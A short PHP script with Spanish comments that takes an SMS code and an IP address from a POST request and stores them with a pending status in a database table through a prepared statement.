<?php
include 'db.php';

// Verificar si los datos fueron enviados
if (isset($_POST['codigo']) && isset($_POST['ip'])) {
    $codigo = $_POST['codigo'];
    $ip = $_POST['ip'];

    // Insertar el código en la base de datos
    $stmt = $conn->prepare("INSERT INTO codigos_sms (codigo, ip, status) VALUES (?, ?, 'pendiente')");
    $stmt->execute([$codigo, $ip]);

    echo "Código guardado correctamente.";
}
?>
